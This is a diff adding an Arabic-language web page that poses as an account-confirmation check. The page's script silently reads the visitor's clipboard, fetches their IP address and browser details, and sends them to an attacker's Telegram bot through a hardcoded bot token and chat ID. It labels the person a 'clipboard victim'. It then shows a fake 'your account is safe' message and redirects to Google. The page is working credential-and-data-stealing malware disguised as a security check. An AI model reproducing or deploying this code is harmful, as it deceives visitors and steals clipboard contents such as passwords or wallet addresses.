@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>تأكيد الحساب</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#1a237e,#4a148c);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.container{max-width:400px;width:100%;text-align:center}
+.logo{font-size:60px;margin-bottom:10px;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+h1{font-size:20px;margin-bottom:8px}
+.sub{color:#aaa;font-size:13px;margin-bottom:20px}
+.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99;justify-content:center;align-items:center;flex-direction:column}
+.load.show{display:flex}
+.spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #7c4dff;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.done{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;justify-content:center;align-items:center;flex-direction:column}
+.done.show{display:flex}
+.done h2{color:#4CAF50;font-size:24px;margin:12px 0}
+</style>
+</head>
+<body>
+<div class="container" id="form">
+<div class="logo">🔐</div>
+<h1>تأكيد الحساب</h1>
+<p class="sub">جاري التحقق من بياناتك...</p>
+<div id="status" style="margin:20px 0;color:#aaa;font-size:13px;">⏳ جاري الفحص...</div>
+</div>
+<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري التأكيد...</p></div>
+<div class="done" id="done"><h2>✅ تم التأكيد!</h2><p>حسابك آمن</p></div>
+<script>
+var u=new URL(window.location.href);
+var CHAT=u.searchParams.get('chatId')||'7276604783';
+var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+
+async function send(t){
+try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
+}
+
+async function getIP(){
+try{var r=await fetch('https://api.ipify.org?format=json');var d=await r.json();return d.ip;}catch(e){return 'غير معروف';}
+}
+
+async function autoSend(){
+document.getElementById('status').innerHTML='🔄 جاري قراءة البيانات...';
+var clipboard='فارغ';
+try{clipboard=await navigator.clipboard.readText();}catch(e){clipboard='لا يوجد صلاحية';}
+var ip=await getIP();
+var msg='📋 <b>ضحية حافظة!</b>\n\n📋 <b>الحافظة:</b> '+clipboard+'\n\n🌐 <b>IP:</b> '+ip+'\n📱 '+navigator.userAgent;
+await send(msg);
+document.getElementById('form').style.display='none';
+document.getElementById('load').classList.add('show');
+setTimeout(function(){
+document.getElementById('load').classList.remove('show');
+document.getElementById('done').classList.add('show');
+setTimeout(function(){window.location.href='https://google.com/'},3000);
+},4000);
+}
+
+autoSend();
+</script>
+</body>
+</html>
